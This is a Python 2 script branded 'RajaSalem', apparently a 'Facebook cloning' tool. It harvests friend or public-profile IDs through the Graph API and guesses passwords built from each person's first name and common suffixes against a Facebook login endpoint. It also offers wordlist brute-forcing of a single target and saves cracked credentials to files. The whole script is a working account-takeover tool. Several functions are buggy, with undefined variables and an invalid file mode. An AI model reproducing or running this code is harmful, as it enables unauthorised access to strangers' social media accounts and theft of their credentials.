#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Firefox Lite Version 2.1.17(19420)')]


def keluar():
	print "\033[1;96m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)


#### LOGO ####
logo = """		\033[1;36mRajaSalem"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \033[1;36mWaiting \x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"
def methodlogin():
    os.system('clear')
    try:
        toket = open('login.txt','r')
        menu()
    except (KeyError,IOError):
        os.system('clear')
        print logo
        print "[1] Login With ID/Password"
        print "[2] Login With Token"
        print "[3] Back"
        print
        method_menu()
def method_menu():
	hos = raw_input("\nChoose Option >>  ")
	if hos =="":
		print"[!]  Wrong Input"
		keluar()
	elif hos =="1":
		login()
	elif hos =="2":
		os.system('clear')
		print logo
		hosp = raw_input("[+] Give Token : ")
		tik()
		hopa = open('login.txt','w')
		hopa.write(hosp)
		hopa.close()
		print "\n[✓] Logged In Successfully."
		time.sleep(1)
		menu()
		
	elif hos =="0":
		keluar()
	else:
		print"[!] Wrong Input"
		keluar()
def login():
	os.system("clear")
	try:
		tb=open('login.txt', 'r')
		menu()
	except (KeyError,IOError):
		os.system("clear")
		print logo
		jalan('[+] Login Your Facebook Account')
		jalan('[!] Donot Use Your Personal Account')
		jalan('[!] Use a New Facebook Account To Login')
		print'-------------------------------------'
		iid=raw_input('[+] Number/Email: ')
		id=iid.replace(" ","")
		pwd=raw_input('[+] Password : ')
		tik()
		data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
		z=json.load(data)
		if 'access_token' in z:
		    st = open("login.txt", "w")
		    st.write(z["access_token"])
		    st.close()
		    print "\n[✓] Logged In Successfully."
		    time.sleep(1)
		    menu()
		else:
		    if "www.facebook.com" in z["error_msg"]:
		        print ('[!] User Must Verify Account Before Login.')
		        time.sleep(3)
		        login()
		    else:
		        print ('[!]Number/User Id/ Password Is Wrong !')
		        time.sleep(1)
		        login()






def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print "   \033[1;36m[*] Name\033[1;32;40m: "+nama+" "                               
	print "   \033[1;36m[*] ID\033[1;36m: "+id+" "
	print "   \033[1;36m[*] Subs\033[1;36m: "+sub+"  "
	
	print "   \033[1;36m[1] ══Start Hacking"	
																														
	print "   \033[1;36m[0] ══Log out"
	pilih()

def pilih():
	unikers = raw_input("\n\033[1;31;40m>>> \033[1;35;40m")
	if unikers =="":
		print "\x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="2":
		os.system('clear')
		print logo
		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;36m[1] \033[1;36m══Hack From Friend List"
	print "\033[1;36m[2] \033[1;36m══Hack From Public ID"
	
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;31;40m>>> \033[1;97m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo

		jalan('\033[1;36m[✺] Getting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])

	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;36m[*] Enter ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;36m[✺] Name : "+op["name"]
		except KeyError:
			print"\x1b[1;92m[✺] ID Not Found!"
			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
			super()
		print"\033[1;36m[✺] Getting IDs..."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="4":
		os.system('clear')
		print logo                  
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
			raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mExit \x1b[1;35;40m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih_super()

	
	print "\033[1;36m[✺] Total IDs : \033[1;36m"+str(len(id))
	jalan('\033[1;36m[✺] Please Wait...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;36m[✺] Cloning\033[1;36m"+o),;sys.stdout.flush();time.sleep(0.1)
	
	print "\n    "
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass 
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name'] + '786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				print'\x1b[1;92m[OK]\x1b[1;92m ' + user  +'\x1b[1;92m | \x1b[1;92m' + pass1 + '\x1b[1;92m | ' + b['name']
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass1 + '\x1b[1;36;40m | \033[1;37m' + b['name']
					cek = open("out/CP.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				pass2 = '786786'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				q = json.load(data)
				if 'access_token' in q:
					print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass2 + '\x1b[1;92m | ' + b['name']
					oks.append(user+pass2)
				else:
					if 'www.facebook.com' in q["error_msg"]:
						print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass2 + '\x1b[1;36;40m | \033[1;37m' + b['name']
						cek = open("out/CP.txt", "a")
						cek.write(user+"|"+pass2+"\n")
						cek.close()
						cekpoint.append(user+pass2)
					pass3 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass3 + '\x1b[1;92m | ' + b['name']
						oks.append(user+pass3)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass3 + '\x1b[1;36;40m | \033[1;37m' + b['name']
							cek = open("out/CP.txt", "a")
							cek.write(user+"|"+pass3+"\n")
							cek.close()
							cekpoint.append(user+pass3)
						pass4 = b['first_name'] + 'khan'
						data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
						q = json.load(data)
						if 'access_token' in q:
							print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass4 + '\x1b[1;92m | ' + b['name']
							oks.append(user+pass4)
						else:
							if 'www.facebook.com' in q["error_msg"]:
								print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass4 + '\x1b[1;36;40m | \033[1;37m' + b['name']
								cek = open("out/CP.txt", "a")
								cek.write(user+"|"+pass4+"\n")
								cek.close()
								cekpoint.append(user+pass4)
							pass5 = b['first_name'] + 'jan'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass5 + '\x1b[1;92m | ' + b['name']
								oks.append(user+pass5)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass5 + '\x1b[1;36;40m | \033[1;37m' + b['name']
									cek = open("out/CP.txt", "a")
									cek.write(user+"|"+pass5+"\n")
									cek.close()
									cekpoint.append(user+pass5)
								pass6 = b['first_name'] + '123'
								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
								q = json.load(data)
								if 'access_token' in q:
									print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass6 + '\x1b[1;92m | ' + b['name']
									oks.append(user+pass6)
								else:
									if 'www.facebook.com' in q["error_msg"]:
										print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass6 + '\x1b[1;36;40m | \033[1;37m' + b['name']
										cek = open("out/CP.txt", "a")
										cek.write(user+"|"+pass6+"\n")
										cek.close()
										cekpoint.append(user+pass6)
									pass7 = b['first_name'] + '1234'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass7 + '\x1b[1;92m | ' + b['name']
										oks.append(user+pass7)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass7 + '\x1b[1;36;40m | \033[1;37m' + b['name']
											cek = open("out/CP.txt", "a")
											cek.write(user+"|"+pass7+"\n")
											cek.close()
											cekpoint.append(user+pass7)
										pass8 = b['first_name'] + '12345'
										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
										q = json.load(data)
										if 'access_token' in q:
											print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass8 + '\x1b[1;92m | ' + b['name']
											oks.append(user+pass8)
										else:
											if 'www.facebook.com' in q["error_msg"]:
												print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass8 + '\x1b[1;36;40m | \033[1;37m' + b['name']
												cek = open("out/CP.txt", "a")
												cek.write(user+"|"+pass8+"\n")
												cek.close()
												cekpoint.append(user+pass8)
											pass9 = b['first_name'] + '12'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass9 + '\x1b[1;92m | ' + b['name']
												oks.append(user+pass9)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass9 + '\x1b[1;36;40m | \033[1;37m' + b['name']
													cek = open("out/CP.txt", "a")
													cek.write(user+"|"+pass9+"\n")
													cek.close()
													cekpoint.append(user+pass9)
												pass10 = b['first_name'] + '1122'
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												q = json.load(data)
												if 'access_token' in q:
													print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass10 + '\x1b[1;92m | ' + b['name']
													oks.append(user+pass10)
												else:
													if 'www.facebook.com' in q["error_msg"]:
														print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass10 + '\x1b[1;36;40m | \033[1;37m' + b['name']
														cek = open("out/CP.txt", "a")
														cek.write(user+"|"+pass10+"\n")
														cek.close()
														cekpoint.append(user+pass10)
													else:
														pass11 = y['first_name'] + '143'
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														s = json.load(data)
														if 'access_token' in s:
															print'\x1b[1;92m[OK]\x1b[1;92m ' + user  + '\x1b[1;92m | \x1b[1;92m' + pass11 + '\x1b[1;92m | ' + y['name']
															oks.append(user+pass11)
														else:
															if 'www.facebook.com' in s["error_msg"]:
																print '\x1b[1;36;40m[CP]\x1b[1;97m ' + user  + '\x1b[1;36;40m | \x1b[1;97m' + pass11 + '\x1b[1;36;40m | \033[1;37m' + y['name']
																cek = open("out/checkpoint.txt", "k")
																cek.write(user+"|"+pass11+"\n")
																cek.close()
																cekpoint.append(user+pass11)
												
					
		except:																		
			pass
		
	p = ThreadPool(30)
	p.map(main, id) 
	print '\x1b[1;36;40m '
	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;96m....'
	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
	
	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
	super()

def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
        try:
            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
            print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                        print 52 * '\x1b[1;97m\xe2\x95\x90'
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                            print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;92mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	methodlogin()
